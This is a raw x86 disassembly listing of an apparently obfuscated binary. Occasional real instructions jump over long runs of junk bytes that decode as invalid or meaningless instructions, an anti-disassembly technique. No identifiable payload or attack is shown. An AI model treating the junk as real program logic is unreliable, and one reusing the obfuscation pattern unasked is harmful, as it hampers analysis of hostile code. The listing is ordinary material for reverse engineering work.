  41777d:	push   ebp
  41777e:	aam    0xc1
  417780:	loopne 0x417709
  417782:	in     al,0x62
  417784:	std    
  417785:	mov    al,ds:0x28b1ca49
  41778a:	and    eax,0xbe99a2e4
  41778f:	cmp    eax,0x7b042bd0
  417794:	jmp    0x700fd7a4
  417799:	sbb    BYTE PTR [ebp-0x36],dh
  41779c:	mov    DWORD PTR [eax+0x265c6b07],ecx
  4177a2:	push   ss
  4177a3:	and    DWORD PTR ds:0xb29a6072,esp
  4177a9:	mov    DWORD PTR [ebp+0xc],0x17e1
  4177b0:	mov    DWORD PTR [ebp+0x8],0x1b0f
  4177b7:	jmp    0x41788b
  4177bc:	xor    al,0x7
  4177be:	and    al,0xcc
  4177c0:	aaa    
  4177c1:	out    dx,eax
  4177c2:	cld    
  4177c3:	(bad)  
  4177c4:	out    dx,al
  4177c5:	pushf  
  4177c6:	int    0x8e
  4177c8:	gs sahf 
  4177ca:	sbb    DWORD PTR [eax+0x76],esi
  4177cd:	or     eax,DWORD PTR [ecx]
  4177cf:	add    BYTE PTR [edi-0x50000000],dh
  4177d5:	pusha  
  4177d6:	call   0x498ce3d4
  4177db:	mov    ch,0xb2
  4177dd:	jle    0x4177c8
  4177df:	xchg   BYTE PTR [ecx-0x20],al
  4177e2:	fdecstp 
  4177e4:	pop    ss
  4177e5:	and    bl,bh
  4177e7:	dec    esp
  4177e8:	ss push edi
  4177ea:	jae    0x417819
  4177ec:	xchg   esp,eax
  4177ed:	pusha  
  4177ee:	jg     0x417803
  4177f0:	lahf   
  4177f1:	pop    esp
  4177f2:	cld    
  4177f3:	xchg   ebx,edx
  4177f5:	bound  esi,QWORD PTR [eax-0x29]
  4177f8:	test   al,0x52
  4177fa:	mov    ecx,0x5a801fb3
  4177ff:	pop    ecx
  417800:	aad    0xb
  417802:	inc    ebp
  417803:	pop    ss
  417804:	push   ecx
  417805:	in     al,0xcf
  417807:	mov    ecx,0x5c78f3a
  41780c:	sbb    eax,0xcfa23781
  417811:	jmp    0x41785e
  417813:	mov    bl,0x9e
  417815:	or     ah,0xc
  417818:	mov    esp,0xd2f2a82
  41781d:	addr16 mov ecx,0xee689d7a
  417823:	push   ebp
  417824:	pusha  
  417825:	pop    esi
  417826:	(bad)  
  417827:	cld    
  417828:	xor    esp,esp
  41782a:	ficomp WORD PTR [edx]
  41782c:	push   esi
  41782d:	sbb    esi,DWORD PTR [edi-0xff17a87]
  417833:	push   esp
  417834:	jns    0x417852
  417836:	push   cs
  417837:	jb     0x417882
  417839:	shl    BYTE PTR [eax-0x80],0x4f
  41783d:	jo     0x4177ff
  41783f:	mov    ecx,0xb99b7c51
  417844:	pop    eax
  417845:	je     0x41785a
  417847:	push   esi
  417848:	adc    eax,0x1f46c0a9
  41784d:	sahf   
  41784e:	ss retf 0x6360
  417852:	sub    al,0x43
  417854:	inc    esi
  417855:	repnz sbb DWORD PTR [edi],ecx
  417858:	lds    edx,FWORD PTR [eax+0x26]
  41785b:	adc    DWORD PTR [ecx],edx
  41785d:	push   ecx
  41785e:	mov    ds:0x909ddc2c,al
  417863:	lods   eax,DWORD PTR ds:[esi]
  417864:	dec    ebp
  417865:	pop    esi
  417866:	hlt    
  417867:	cmc    
  417868:	mov    WORD PTR [eax-0x105e087b],ss
  41786e:	xor    DWORD PTR [esi+0x40],ecx
  417871:	inc    edi
  417872:	xchg   DWORD PTR [edx-0x45],ecx
  417875:	mov    DWORD PTR [ebx+ecx*4],esi
  417878:	mov    ds:0x6355cec1,al
  41787d:	jmp    0x58c5:0x337457ee
  417884:	lock fmul st(7),st
  417887:	sbb    BYTE PTR [edi-0xe],al
  41788a:	leave  
  41788b:	mov    eax,DWORD PTR [ebp+0x8]
  41788e:	mov    ecx,DWORD PTR [ebp+0xc]
  417891:	and    eax,ecx
  417893:	mov    ecx,DWORD PTR [ebp-0xc]
  417896:	imul   eax,ecx
  417899:	mov    ecx,DWORD PTR [ebp+0x10]
  41789c:	xor    eax,0x1446711
  4178a1:	jmp    0x417975
  4178a6:	cmp    BYTE PTR [esi+ecx*8-0x42a411b5],bl
  4178ad:	jmp    DWORD PTR [edi-0x49]
  4178b0:	mov    al,0xe4
  4178b2:	add    bl,BYTE PTR [eax+esi*1+0x39]
  4178b6:	sub    eax,0xb700010c
  4178bb:	add    BYTE PTR [eax],al
  4178bd:	add    BYTE PTR [ebp+0x462a89f],bh
  4178c3:	mov    bl,0x94
  4178c5:	adc    eax,DWORD PTR [ecx]
  4178c7:	mov    esp,0xbd89297a
  4178cc:	in     eax,dx
  4178cd:	adc    cl,BYTE PTR ds:0x5c01a617
  4178d3:	lahf   
  4178d4:	mov    ch,0xdd
  4178d6:	mov    ebp,0xfd714e7f
  4178db:	sbb    eax,esi
  4178dd:	in     eax,0x5d
  4178df:	xchg   esi,eax
  4178e0:	sub    BYTE PTR [esi],bh
  4178e2:	mov    ah,0x0
  4178e4:	cmp    al,0x8f
  4178e6:	xchg   ecx,eax
  4178e7:	ss inc esp
  4178e9:	inc    eax
  4178ea:	jne    0x4178c7
  4178ec:	idiv   DWORD PTR [edi+0x4a]
  4178ef:	out    dx,eax
  4178f0:	lods   eax,DWORD PTR ds:[esi]
  4178f1:	add    dl,ch
  4178f3:	loop   0x4178a4
  4178f5:	push   es
  4178f6:	out    dx,al
  4178f7:	lods   al,BYTE PTR ds:[esi]
  4178f8:	pushf  
  4178f9:	jnp    0x417961
  4178fb:	stc    
  4178fc:	xor    dl,dl
  4178fe:	adc    al,0x38
  417900:	call   0x5fa1:0x6edb3421
  417907:	jge    0x4178e4
  417909:	ds mov dl,0xf2
  41790c:	cmp    al,dh
  41790e:	xchg   esi,esi
  417910:	scas   eax,DWORD PTR es:[edi]
  417911:	push   esp
  417912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417913:	jmp    0x1028a8cc
  417918:	sar    BYTE PTR [ecx+0x6b640661],0x62
  41791f:	int3   
  417920:	ret    0x1af7
  417923:	stos   DWORD PTR es:[edi],eax
  417924:	add    eax,DWORD PTR [esi]
  417926:	rcr    BYTE PTR [edi],cl
  417928:	mov    al,ds:0x4ac2d2f7
  41792d:	(bad)  
  41792e:	(bad)  
  41792f:	cdq    
  417930:	and    al,0x1b
  417932:	push   ebp
  417933:	inc    edx
  417934:	clc    
  417935:	cmp    BYTE PTR fs:[eax+0x11],al
  417939:	or     ah,ah
  41793b:	hlt    
  41793c:	ds repz (bad) 
  41793f:	and    al,0x6b
  417941:	push   ebx
  417942:	sub    esp,esi
  417944:	dec    esi
  417945:	cmp    ebp,DWORD PTR [edx+0x4]
  417948:	mov    ah,0x8e
  41794a:	add    DWORD PTR [ebx],edi
  41794c:	adc    eax,0x1d44378b
  417951:	shl    BYTE PTR [ebx-0x4372878],1
  417957:	xor    DWORD PTR [edi+edi*8+0x61],0xffffffb2
  41795c:	(bad)  
  41795d:	sbb    DWORD PTR [ecx-0x62],edx
  417960:	dec    esi
  417961:	mov    ?,eax
  417963:	dec    edi
  417964:	in     al,dx
  417965:	hlt    
  417966:	jmp    0x677540e2
  41796b:	adc    BYTE PTR [edi-0x7d9f6121],bh
  417971:	sbb    DWORD PTR [ebx],eax
  417973:	pusha  
  417974:	test   eax,0x4864c89
  417979:	mov    DWORD PTR [ebp-0xc],0x55b6
  417980:	jmp    0x417a54
  417985:	clc    
  417986:	push   0xffffff9c
  417988:	add    eax,0xfff9f79e
  41798d:	pop    es
  41798e:	jmp    0x417971
  417990:	or     eax,0x65bec3bd
  417995:	in     al,0xc
  417997:	add    DWORD PTR [eax],eax
  417999:	mov    bh,0x0
  41799b:	add    BYTE PTR [eax],al
  41799d:	or     al,0xcb
  41799f:	sar    DWORD PTR [ecx],0xe8
  4179a2:	ss out 0x57,al
  4179a5:	adc    ebp,DWORD PTR [ecx+0x1001cdaa]
  4179ab:	push   edi
  4179ac:	jns    0x41796a
  4179ae:	xor    BYTE PTR [edi+ebx*1-0x6a0b7152],bh
  4179b5:	sar    DWORD PTR [eax],0x9f
  4179b8:	push   esp
  4179b9:	push   ebx
  4179ba:	push   ss
  4179bb:	lea    edx,[eax]
  4179bd:	pop    ds
  4179be:	nop
  4179bf:	retf   
  4179c0:	int    0x14
  4179c2:	fcmovne st,st(3)
  4179c4:	pop    ebx
  4179c5:	cmp    eax,0xf39441a5
  4179ca:	mov    al,ds:0xa2b23f2d
  4179cf:	in     al,dx
  4179d0:	xchg   ecx,eax
  4179d1:	mov    ah,0x56
  4179d3:	in     al,0xb3
  4179d5:	or     ebp,DWORD PTR [edx-0x34ab02ed]
  4179db:	xchg   edx,eax
  4179dc:	into   
  4179dd:	jge    0x417a10
  4179df:	pushf  
  4179e0:	and    DWORD PTR [ebx],esi
  4179e2:	sbb    esi,DWORD PTR [edi-0x1332352]
  4179e8:	loope  0x417a42
  4179ea:	sub    al,0x18
  4179ec:	aas    
  4179ed:	dec    edx
  4179ee:	cwde   
  4179ef:	push   esp
  4179f0:	loope  0x417a02
  4179f2:	pop    edx
  4179f3:	int3   
  4179f4:	iret   
  4179f5:	leave  
  4179f6:	cmp    BYTE PTR [ebp+0x5b],dl
  4179f9:	mov    esp,0xa8f8e2ec
  4179fe:	mov    dh,0x19
  417a00:	sub    bl,ah
  417a02:	aam    0x49
  417a04:	push   esp
  417a05:	mov    ebp,0xf1bd0947
  417a0a:	ret    0xcf64
  417a0d:	shl    DWORD PTR [eax-0x29dbe85b],cl
  417a13:	inc    ebx
  417a14:	mov    gs,WORD PTR [edi+0x12]
  417a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a18:	(bad)  
  417a19:	(bad)  
  417a1b:	jge    0x417a96
  417a1d:	push   0x90af4fad
  417a22:	hlt    
  417a23:	outs   dx,DWORD PTR ds:[esi]
  417a24:	dec    esp
  417a25:	out    dx,al
  417a26:	push   edi
  417a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a28:	mov    ds:0xf4fd4f87,al
  417a2d:	mov    ah,0xe0
  417a2f:	mov    edi,ebx
  417a31:	call   esi
  417a33:	jne    0x4179e7
  417a35:	sub    eax,0xc2a0cfff
  417a3a:	xchg   edx,eax
  417a3b:	in     eax,dx
  417a3c:	add    edi,esp
  417a3e:	and    DWORD PTR [esi+0x703812b],edx
  417a44:	push   eax
  417a45:	pop    ss
  417a46:	or     esi,ecx
  417a48:	push   0x8de4f141
  417a4d:	sbb    DWORD PTR [esi+0x3ae799b3],esp
  417a53:	push   esi
  417a54:	mov    DWORD PTR [ebp+0x10],0x6b17
  417a5b:	mov    DWORD PTR [ebp+0xc],0x1147
  417a62:	jmp    0x417b36
  417a67:	push   ebx
  417a68:	mov    esi,0x5dff51b3
  417a6d:	repz mov esi,0x6d59db0f
  417a73:	push   cs
  417a74:	adc    al,0x74
  417a76:	xchg   edx,eax
  417a77:	fwait
  417a78:	or     eax,0xb70001
  417a7d:	add    BYTE PTR [eax],al
  417a7f:	push   esi
  417a80:	pop    edi
  417a81:	push   0x810c67cf
  417a86:	retf   0x88f3
  417a89:	cli    
  417a8a:	lods   al,BYTE PTR ds:[esi]
  417a8b:	jp     0x417aac
  417a8d:	les    edx,FWORD PTR [ebx-0x5ffa4c7e]
  417a93:	out    0xfc,al
  417a95:	lods   eax,DWORD PTR ds:[esi]
  417a96:	mov    dl,0xd5
  417a98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a99:	and    eax,0x49267be1
  417a9e:	jl     0x417aa3
  417aa0:	scas   eax,DWORD PTR es:[edi]
  417aa1:	cs sbb eax,0x1187a288
  417aa7:	add    esp,ecx
  417aa9:	mov    WORD PTR [esi-0x37],?
  417aac:	sub    BYTE PTR [ecx+eiz*4+0x35],bl
  417ab0:	out    0x1f,al
  417ab2:	sub    esp,DWORD PTR [edi+0x2e]
  417ab5:	jae    0x417aa3
  417ab7:	popf   
  417ab8:	xor    dl,BYTE PTR [ebp+0x6]
  417abb:	les    ecx,FWORD PTR [ebp+0x13]
  417abe:	fnsave [ebx+0x3c9f0595]
  417ac4:	push   edi
  417ac5:	add    eax,0x651c9ef7
  417aca:	aas    
  417acb:	pop    edx
  417acc:	mov    ecx,0x2ecf70f5
  417ad1:	push   es
  417ad2:	ror    DWORD PTR [edx*8+0x36920160],0x98
  417ada:	gs jmp 0x546a:0xc9405238
  417ae2:	test   eax,0x5af5b12f
  417ae7:	inc    esi
  417ae8:	or     BYTE PTR [eax+esi*4-0x7ba47227],0xa6
  417af0:	sbb    BYTE PTR [ebx],ch
  417af2:	loope  0x417abb
  417af4:	das    
  417af5:	and    ebx,DWORD PTR [esi+0x5134f85d]
  417afb:	retf   0x24cb
  417afe:	push   esi
  417aff:	in     eax,0xe7
  417b01:	xchg   edi,eax
  417b02:	add    ah,BYTE PTR [edx-0x7298fe9b]
  417b08:	cmp    eax,0x272a2ef4
  417b0d:	aad    0xa5
  417b0f:	cmp    cl,BYTE PTR [eax+edi*4+0x40]
  417b13:	popf   
  417b14:	repz pusha 
  417b16:	and    eax,0x8e878bed
  417b1b:	fs inc eax
  417b1d:	popa   
  417b1e:	mov    bh,0x7c
  417b20:	fld    QWORD PTR [edx+0x32e4c925]
  417b26:	and    DWORD PTR [ebx+0x40d00b4a],ebx
  417b2c:	xchg   edx,eax
  417b2d:	sbb    ch,bh
  417b2f:	xchg   ebx,eax
  417b30:	sahf   
  417b31:	rol    edx,1
  417b33:	inc    ebx
  417b34:	mov    ecx,0x845c7d7
  417b39:	call   0x845:0x8b000033
  417b40:	mov    ecx,DWORD PTR [ebp+0xc]
  417b43:	add    eax,0x3a1a
  417b48:	and    eax,ecx
  417b4a:	mov    ecx,DWORD PTR [ebp+0x10]
  417b4d:	and    eax,ecx
  417b4f:	jmp    0x417c23
  417b54:	cmp    ah,BYTE PTR [eax-0x41907]
  417b5a:	aas    
  417b5b:	cld    
  417b5c:	(bad)  
  417b5d:	imul   edx,DWORD PTR [ebx+0x7e854dcd],0x4e
  417b64:	push   edx
  417b65:	push   cs
  417b66:	add    DWORD PTR [eax],eax
  417b68:	mov    bh,0x0
  417b6a:	add    BYTE PTR [eax],al
  417b6c:	aas    
  417b6d:	mov    ds:0xf5cbb2d,eax
  417b72:	pop    eax
  417b73:	mov    esi,ebp
  417b75:	push   esi
  417b76:	jmp    0xfb5a18af
  417b7b:	fadd   QWORD PTR [ecx+edx*8]
  417b7e:	cmc    
  417b7f:	mov    edx,DWORD PTR [ebx+0x678d8495]
  417b85:	int3   
  417b86:	add    DWORD PTR [esi],ebx
  417b88:	outs   dx,DWORD PTR ds:[esi]
  417b89:	ds dec ebp
  417b8b:	jmp    0x417b2d
  417b8d:	jnp    0x417b66
  417b8f:	add    bh,BYTE PTR [edi-0x603a0986]
  417b95:	test   DWORD PTR [ecx],ebx
  417b97:	mov    eax,0xc169a217
  417b9c:	loope  0x417b45
  417b9e:	rcl    BYTE PTR [eax+0x3b],cl
  417ba1:	dec    ebx
  417ba2:	pushf  
  417ba3:	stos   DWORD PTR es:[edi],eax
  417ba4:	mov    bl,0xfc
  417ba6:	push   ds
  417ba7:	sti    
  417ba8:	jno    0x417bbf
  417baa:	dec    esi
  417bab:	int3   
  417bac:	add    cl,dh
  417bae:	jo     0x417b98
  417bb0:	inc    ebp
  417bb1:	xor    eax,0x8f753df8
  417bb6:	(bad)  
  417bb7:	loopne 0x417bc0
  417bb9:	mov    dh,0xca
  417bbb:	xor    al,0x0
  417bbd:	cmc    
  417bbe:	fcmove st,st(4)
  417bc0:	nop
  417bc1:	add    ah,BYTE PTR [edx-0x59]
  417bc4:	fmul   DWORD PTR [ebp+0x13]
  417bc7:	cmc    
  417bc8:	mov    ebx,0xe129b4fa
  417bcd:	imul   DWORD PTR [edi-0x9cfb4de]
  417bd3:	iret   
  417bd4:	out    0x41,eax
  417bd6:	cli    
  417bd7:	pop    ecx
  417bd8:	push   0x5c979cd5
  417bdd:	and    esi,DWORD PTR [edx-0x7af7b578]
  417be3:	stc    
  417be4:	test   eax,0x372230e4
  417be9:	sahf   
  417bea:	sub    BYTE PTR [esi],dl
  417bec:	add    DWORD PTR [eax],edi
  417bee:	pushf  
  417bef:	push   ds
  417bf0:	div    BYTE PTR ds:0xe932b9b6
  417bf6:	mov    bl,0x1f
  417bf8:	call   DWORD PTR [edx-0x75]
  417bfb:	lahf   
  417bfc:	jae    0x417c34
  417bfe:	sbb    esp,ebx
  417c00:	leave  
  417c01:	pop    esp
  417c02:	inc    BYTE PTR [edx-0x7a]
  417c05:	push   edx
  417c06:	loope  0x417c7a
  417c08:	cmc    
  417c09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c0a:	push   0x134506fa
  417c0f:	dec    edi
  417c10:	aaa    
  417c11:	push   edx
  417c12:	sub    BYTE PTR ds:0x5365622f,dl
  417c18:	call   0x62cc:0x1862c671
  417c1f:	cmc    
  417c20:	cmp    BYTE PTR [ecx],bh
  417c22:	cmp    BYTE PTR [ebx-0x3ecc0bb3],cl
  417c28:	xor    edx,edx
  417c2a:	mov    ecx,0x54b2
  417c2f:	div    ecx
  417c31:	pop    edi
  417c32:	leave  
  417c33:	ret    0xc
  417c36:	push   ebp
  417c37:	mov    ebp,esp
  417c39:	sub    esp,0x78
  417c3c:	jmp    0x417d0b
  417c41:	arpl   WORD PTR [ecx+ebp*2],ax
  417c44:	sub    eax,0x4e676d6f
  417c49:	sub    al,0x11
  417c4b:	nop
  417c4c:	movups xmm1,XMMWORD PTR [ecx+0xf0970d6]
  417c53:	add    DWORD PTR [eax],eax
  417c55:	mov    dl,0x0
  417c57:	add    BYTE PTR [eax],al
  417c59:	aaa    
  417c5a:	addr16 dec ebp
  417c5c:	mov    ebp,0xb26297ea
  417c61:	dec    ebx
  417c62:	or     dh,BYTE PTR [ebp+0x41]
  417c65:	outs   dx,DWORD PTR ds:[esi]
  417c66:	call   0x6c82:0xda35c13d
  417c6d:	outs   dx,BYTE PTR ds:[esi]
  417c6e:	mov    bl,0xbd
  417c70:	es xchg ebx,eax
  417c72:	retf   
  417c73:	mov    bh,0x57
  417c75:	pusha  
  417c76:	sub    BYTE PTR [eax-0x25],0xc3
  417c7a:	ror    esi,0xb8
  417c7d:	sbb    cl,BYTE PTR [edi-0x23]
  417c80:	mov    edx,0x7b7e29c6
  417c85:	jg     0x417c40
  417c87:	jmp    0xf4bbc1d2
  417c8c:	enter  0xa349,0x3e
  417c90:	cs xor bh,ch
  417c93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c94:	sar    BYTE PTR [edi+0x3f],0x1d
  417c98:	sub    eax,0x912616c3
  417c9d:	push   ax
  417c9f:	or     ecx,ebp
  417ca1:	xchg   ebp,eax
  417ca2:	sbb    edx,DWORD PTR [edx-0x52dab8eb]
  417ca8:	lds    ebp,FWORD PTR [ecx+0x4d]
  417cab:	mov    eax,0xb5a526af
  417cb0:	icebp  
  417cb1:	call   0x5b88237d
  417cb6:	mov    bh,0xdd
  417cb8:	mov    ecx,0x788db1ad
  417cbd:	gs inc edi
  417cbf:	adc    eax,0x286135d9
  417cc4:	and    BYTE PTR [ebx+0xf],ch
  417cc7:	pop    ds
  417cc8:	jns    0x417c65
  417cca:	mov    DWORD PTR [edx-0x76],ebp
  417ccd:	ins    BYTE PTR es:[edi],dx
  417cce:	data16 adc dh,BYTE PTR [ecx-0x56]
  417cd2:	(bad)  
  417cd3:	jmp    0x132047d
  417cd8:	xchg   BYTE PTR [ecx+0x6],ch
  417cdb:	mov    bl,0x61
  417cdd:	xor    eax,0xd504f
  417ce2:	out    0x47,al
  417ce4:	mov    esi,0xe7eb1799
  417ce9:	pusha  
  417cea:	mov    cl,0x92
  417cec:	sar    DWORD PTR [ebp+0x3a],1
  417cef:	cld    
  417cf0:	jns    0x417d6d
  417cf2:	mov    ch,0x92
  417cf4:	fwait
  417cf5:	in     eax,dx
  417cf6:	loop   0x417cf2
  417cf8:	repz aas 
  417cfa:	in     eax,dx
  417cfb:	mov    eax,0x9bafa162
  417d00:	gs push esp
  417d02:	bound  esi,QWORD PTR [esi]
  417d04:	dec    ebx
  417d05:	sub    eax,0x7a09c334
  417d0a:	icebp  
  417d0b:	push   esi
  417d0c:	jmp    0x417ddb
  417d11:	js     0x417ce3
  417d13:	jl     0x417d06
  417d15:	cld    
  417d16:	std    
  417d17:	std    
  417d18:	fxch   st(2)
  417d1a:	xchg   esi,eax
  417d1b:	(bad)  
  417d1c:	xchg   ebp,eax
  417d1d:	out    0x97,al
  417d1f:	mov    esi,0x10fbb4e
  417d24:	add    BYTE PTR [edx+0x30000000],dh
  417d2a:	shl    BYTE PTR [edi+0x41ed7304],0x6a
  417d31:	loope  0x417cd2
  417d33:	loop   0x417d3e
  417d35:	aaa    
  417d36:	pusha  
  417d37:	inc    ebx
  417d38:	test   eax,0xb5a9d83f
  417d3d:	mov    dh,0xd9
  417d3f:	ja     0x417d44
  417d41:	cld    
  417d42:	test   DWORD PTR ds:0xd494eae9,esp
  417d48:	hlt    
  417d49:	cmp    dh,al
  417d4b:	or     BYTE PTR [edi],0xaf
  417d4e:	adc    eax,0x43e36a68
  417d53:	jbe    0x417d2c
  417d55:	lods   eax,DWORD PTR ds:[esi]
  417d56:	dec    DWORD PTR [ebp-0x2f]
  417d59:	sbb    al,0x92
  417d5b:	fisub  DWORD PTR [edi-0x448cfe6f]
  417d61:	cmp    BYTE PTR [eax+0x6f],dh
  417d64:	adc    eax,0x4987f331
  417d69:	pop    edi
  417d6a:	retf   0x8aad
  417d6d:	push   0x2bcb3593
  417d72:	mov    dh,0x51
  417d74:	xor    al,0xe1
  417d76:	mov    dl,0xcc
  417d78:	test   DWORD PTR [esi+ebp*4+0x72d6a584],ebp
  417d7f:	jae    0x417d82
  417d81:	adc    DWORD PTR [ecx+0x4],edi
  417d84:	xor    bx,WORD PTR [edx+0x22a920db]
  417d8b:	fild   DWORD PTR [esi-0x7a]
  417d8e:	mov    ebx,0x74794a4f
  417d93:	mul    BYTE PTR [edi+0x70]
  417d96:	fs int 0x5c
  417d99:	sub    DWORD PTR [edx],ecx
  417d9b:	add    DWORD PTR [eax],esi
  417d9d:	in     al,0xfa
  417d9f:	in     eax,0xac
  417da1:	out    0x7f,al
  417da3:	add    ebx,DWORD PTR [ebx-0x7f]
  417da6:	jae    0x417daa
  417da8:	mov    ds:0x299afa9e,al
  417dad:	das    
  417dae:	dec    ebx
  417daf:	pop    ebx
  417db0:	mov    dl,0xfa
  417db2:	or     bl,BYTE PTR [ebx+0x32]
  417db5:	dec    eax
  417db6:	push   es
  417db7:	cmp    BYTE PTR ds:0x46a6c404,0xa2
  417dbe:	sar    BYTE PTR [esi+0x5fbd41cc],cl
  417dc4:	imul   edx,DWORD PTR [ebx+0x17220229],0xee83ef16
  417dce:	rcr    dl,0x11
  417dd1:	mov    ebp,0x4999bc80
  417dd6:	test   eax,0xc509f7d5
  417ddb:	mov    DWORD PTR [ebp-0x60],0x23df
  417de2:	mov    DWORD PTR [ebp-0x5c],0x7f33
  417de9:	mov    DWORD PTR [ebp-0x58],0x74e0
  417df0:	mov    DWORD PTR [ebp-0x54],0x16db
  417df7:	mov    DWORD PTR [ebp-0x50],0x7319
  417dfe:	jmp    0x417ecd
  417e03:	jae    0x417daf
  417e05:	jmp    0x7c1577da
  417e0a:	stos   DWORD PTR es:[edi],eax
  417e0b:	aam    0x69
  417e0d:	inc    edi
  417e0e:	je     0x417e21
  417e10:	mov    bl,0x5
  417e12:	xor    ebp,DWORD PTR [ebp+0x10]
  417e15:	add    DWORD PTR [eax],eax
  417e17:	mov    dl,0x0
  417e19:	add    BYTE PTR [eax],al
  417e1b:	xchg   esp,eax
  417e1c:	mov    cl,0xaf
  417e1e:	add    edx,DWORD PTR [ecx+0x26224b53]
  417e24:	fnsave [edx-0x58]
  417e27:	push   edi
  417e28:	add    DWORD PTR [ebx],eax
  417e2a:	call   0x4344f929
  417e2f:	ret    
  417e30:	scas   eax,DWORD PTR es:[edi]
  417e31:	add    ebp,esp
  417e33:	mov    edi,0xcafef359
  417e38:	(bad)  
  417e39:	pop    esi
  417e3a:	repnz push ss
  417e3c:	cmp    eax,0x337370a0
  417e41:	sub    BYTE PTR [eax+0x62eb95db],al
  417e47:	ja     0x417e3e
  417e49:	dec    ebp
  417e4a:	sbb    edx,DWORD PTR [esi-0x3e]
  417e4d:	push   ecx
  417e4e:	pop    ebp
  417e4f:	cli    
  417e50:	adc    eax,0x77155001
  417e55:	jne    0x417eb5
  417e57:	push   es
  417e58:	idiv   BYTE PTR [esi]
  417e5a:	dec    ecx
  417e5b:	xchg   edx,eax
  417e5c:	add    ecx,DWORD PTR [eax-0x59]
  417e5f:	enter  0x5ec1,0xd
  417e63:	out    0xcf,eax
  417e65:	sahf   
  417e66:	retf   0xcbe2
  417e69:	mov    al,0xbe
  417e6b:	push   ds
  417e6c:	in     al,dx
  417e6d:	int3   
  417e6e:	inc    edi
  417e6f:	xor    BYTE PTR [eax],ch
  417e71:	cmc    
  417e72:	cmp    al,0xe8
  417e74:	icebp  
  417e75:	jecxz  0x417e7d
  417e77:	ins    DWORD PTR es:[edi],dx
  417e78:	sub    ch,dl
  417e7a:	aaa    
  417e7b:	std    
  417e7c:	mov    ah,0x8b
  417e7e:	rcr    BYTE PTR [ebx+0x3e],cl
  417e81:	cs (bad) 
  417e84:	sub    ebx,DWORD PTR [ecx-0x5f]
  417e87:	mov    eax,ds:0x925d8a8e
  417e8c:	loope  0x417ee5
  417e8e:	les    ebx,FWORD PTR [esi-0x37623e10]
  417e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e95:	mov    ah,0x1
  417e97:	mov    dh,0xa0
  417e99:	aaa    
  417e9a:	jp     0x417e9c
  417e9c:	add    BYTE PTR [edx+eax*8],ah
  417e9f:	call   0x69bc:0x429c528d
  417ea6:	and    edi,DWORD PTR [eax+0x68a7e412]
  417eac:	es in  al,0x3e
  417eaf:	push   edi
  417eb0:	sbb    edi,DWORD PTR es:[edi+0x20]
  417eb4:	out    0xbb,eax
  417eb6:	out    dx,eax
  417eb7:	dec    esp
  417eb8:	push   ecx
  417eb9:	ja     0x417e63
  417ebb:	jle    0x417f1f
  417ebd:	cmp    eax,edx
  417ebf:	repz rol DWORD PTR [edi-0x6b814061],1
  417ec6:	inc    esi
  417ec7:	cmp    esi,edi
  417ec9:	(bad)  
  417eca:	in     al,dx
  417ecb:	pop    esp
  417ecc:	jmp    0x417e95
  417ece:	inc    ebp
  417ecf:	mov    ah,0x39
  417ed1:	dec    esi
  417ed2:	add    BYTE PTR [eax],al
  417ed4:	jmp    0x417fa3
  417ed9:	add    BYTE PTR [ebx-0x21e2a7e3],0xc7
  417ee0:	fld    TBYTE PTR [ebp+0x1f9f6265]
  417ee6:	mov    DWORD PTR [ebp+0x1111f38],ecx
  417eec:	add    BYTE PTR [edx+0x45000000],dh
  417ef2:	cmp    eax,0x3a708677
  417ef7:	adc    DWORD PTR [esi-0x670d5bdd],eax
  417efd:	mov    ch,0x27
  417eff:	push   0x6cb172aa
  417f04:	(bad)  
  417f05:	adc    dl,dl
  417f07:	mov    ds:0x9088ecc2,eax
  417f0c:	xchg   esi,eax
  417f0d:	ja     0x417f46
  417f0f:	cmp    eax,0xe5a6ba85
  417f14:	ror    BYTE PTR [ebp-0x3f69641d],cl
  417f1a:	inc    edi
  417f1b:	add    esp,edx
  417f1d:	clc    
  417f1e:	(bad)  
  417f20:	hlt    
  417f21:	add    BYTE PTR [edi+0x2f3936b2],al
  417f27:	les    edx,FWORD PTR [ebx+0xa]
  417f2a:	fist   DWORD PTR [esi]
  417f2c:	test   eax,0xe91b5cec
  417f31:	jg     0x417f58
  417f33:	sti    
  417f34:	mov    eax,0xdf558d82
  417f39:	adc    al,0x6f
  417f3b:	jne    0x417edb
  417f3d:	push   0xffffffe7
  417f3f:	or     cl,BYTE PTR [edx]
  417f41:	das    
  417f42:	push   eax
  417f43:	jae    0x417ee8
  417f45:	es ja  0x417f53
  417f48:	mov    eax,ds:0xf3f51ee2
  417f4d:	jb     0x417ed2
  417f4f:	inc    eax
  417f50:	mov    dh,BYTE PTR [ebp-0x4e]
  417f53:	pop    ebp
  417f54:	push   cs
  417f55:	pushf  
  417f56:	mov    eax,0x265baca6
  417f5b:	pop    esp
  417f5c:	mov    ah,0xe4
  417f5e:	jmp    0x417fa8
  417f60:	cmp    dl,0x8
  417f63:	pop    edx
  417f64:	xor    DWORD PTR [ebx+0xf211ce8],edi
  417f6a:	inc    ecx
  417f6b:	add    esp,eax
  417f6d:	out    0xbd,al
  417f6f:	popf   
  417f70:	retf   
  417f71:	icebp  
  417f72:	inc    ecx
  417f73:	pop    edi
  417f74:	or     DWORD PTR [esi-0x590302d0],edx
  417f7a:	xor    ecx,DWORD PTR [ecx+0x26d94a01]
  417f80:	and    ch,dl
  417f82:	push   esi
  417f83:	ret    0xedc3
  417f86:	(bad)  
  417f88:	cmp    eax,0xeeaddb86
  417f8d:	sti    
  417f8e:	stos   BYTE PTR es:[edi],al
  417f8f:	jae    0x417f8e
  417f91:	adc    eax,0x896f17d0
  417f96:	fnstenv [edi+0x2afb5f24]
  417f9c:	mov    bh,0xb5
  417f9e:	out    dx,eax
  417f9f:	and    esp,DWORD PTR ss:[edi+0x47]
  417fa3:	mov    DWORD PTR [ebp-0x48],0x637e
  417faa:	mov    DWORD PTR [ebp-0x44],0x43fc
  417fb1:	mov    DWORD PTR [ebp-0x40],0x3bc2
  417fb8:	mov    DWORD PTR [ebp-0x3c],0x14f9
  417fbf:	mov    DWORD PTR [ebp-0xc],0x233f
  417fc6:	mov    DWORD PTR [ebp-0x8],0x421c
  417fcd:	mov    DWORD PTR [ebp-0x4],0x3361
